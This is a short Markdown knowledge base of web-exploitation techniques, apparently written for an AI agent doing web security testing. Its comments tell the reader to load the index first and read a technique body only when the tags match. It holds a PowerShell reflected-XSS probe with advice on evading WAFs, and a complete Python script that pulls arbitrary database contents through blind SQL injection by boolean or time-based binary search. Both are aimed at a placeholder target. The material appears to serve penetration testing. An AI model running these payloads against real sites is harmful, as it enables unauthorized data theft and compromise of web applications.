# Web Exploit (native) — Knowledge Base [PROTOTIPO DE ACEITACAO — copia descartavel]
_Last updated: 2026-06-25 — origem: agents/web-testing/web-testing.md (T1,T4) verbatim_

## Index
<!-- Carregue SOMENTE isto. Pare antes de ## Techniques. Leia um corpo apenas quando as Tags casarem. -->
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | Reflected XSS probe | Input refletido sem encoding | 0-native | web-testing, xss |
| T4 | SQL injection extraction | SQLi confirmada — extrair dados | 1-python | web-testing, sqli, tier1-python |

## Techniques
<!-- Formato: references/template-technique.md -->
### T1: Reflected XSS probe
Tags: web-testing, xss
When: User input (query param, header, path) is reflected in the HTML response without encoding.
Why: If the app echoes input unescaped, injecting script tags or event handlers achieves XSS. Native HTTP requests can inject and inspect the response for reflection.
Tier: 0-native
Steps: 1. Identify reflection points 2. Inject canary 3. Check if canary appears unescaped 4. Escalate to a working payload
Payload:
```powershell
$canary = "hkaud" + (Get-Random -Max 9999)
$url = "https://target.example/search?q=$canary<script>alert(1)</script>"
$r = Invoke-WebRequest $url -UseBasicParsing
if ($r.Content -match [regex]::Escape("$canary<script>")) {
    "[XSS] Reflected unescaped at $url"
} elseif ($r.Content -match $canary) {
    "[REFLECT] Canary reflected but encoded — try event handlers / attribute injection"
}
```
Signal: canary reflected unescaped in response body. | Pitfall: WAFs may block `<script>` — try event handlers (`onerror`, `onload`), SVG tags, or encoding variants. Check all reflection contexts (attribute, JS string, URL).
Source: distilled native XSS probe — 2026-06-25

### T4: SQL injection extraction
Tags: web-testing, sqli, tier1-python
When: Confirmed SQLi — need to extract data (DB version, tables, rows).
Why: Blind data extraction requires automated binary-search or time-based loops over many requests. A Python script handles the logic cleanly.
Tier: 1-python
Escalation: blind SQLi data extraction (binary search per character, hundreds of requests) is impractical to orchestrate in a PowerShell loop with adequate error handling; Python provides cleaner control flow.
Steps: 1. Confirm injection type (boolean/time/error/union) 2. Script the extraction 3. Record findings
Payload:
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: blind binary-search extraction
import sys, urllib.request, urllib.parse, time

URL   = sys.argv[1]   # e.g. "https://target.example/api/items?id="
QUERY = sys.argv[2]   # e.g. "SELECT version()"
MODE  = sys.argv[3] if len(sys.argv) > 3 else "boolean"  # boolean | time

result = []
for pos in range(1, 256):
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        if MODE == "boolean":
            inj = f"1' AND ASCII(SUBSTRING(({QUERY}),{pos},1))>{mid}-- -"
            r = urllib.request.urlopen(URL + urllib.parse.quote(inj), timeout=10)
            if len(r.read()) > 500:   # adjust threshold to "true" response size
                lo = mid + 1
            else:
                hi = mid - 1
        elif MODE == "time":
            inj = f"1'; IF(ASCII(SUBSTRING(({QUERY}),{pos},1))>{mid}) WAITFOR DELAY '0:0:2'-- -"
            t0 = time.time()
            try: urllib.request.urlopen(URL + urllib.parse.quote(inj), timeout=10)
            except: pass
            if time.time() - t0 > 1.5:
                lo = mid + 1
            else:
                hi = mid - 1
    ch = chr(lo)
    if lo > 126:
        break
    result.append(ch)
    print(f"[pos {pos}] {''.join(result)}", flush=True)

print(f"\n[RESULT] {''.join(result)}")
```
Signal: extracted data printed. | Pitfall: tune the true/false threshold to the specific app's response. Rate-limit to avoid lockout.
Source: distilled native SQLi extraction — 2026-06-25

